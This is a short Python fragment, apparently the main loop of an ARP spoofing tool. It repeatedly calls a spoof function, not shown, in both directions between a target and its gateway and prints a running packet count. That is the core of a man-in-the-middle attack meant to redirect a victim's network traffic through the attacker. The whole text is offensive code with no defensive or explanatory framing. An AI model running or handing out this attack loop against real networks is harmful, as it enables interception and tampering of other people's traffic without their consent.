sent_packets_count = 0
while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2
		print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
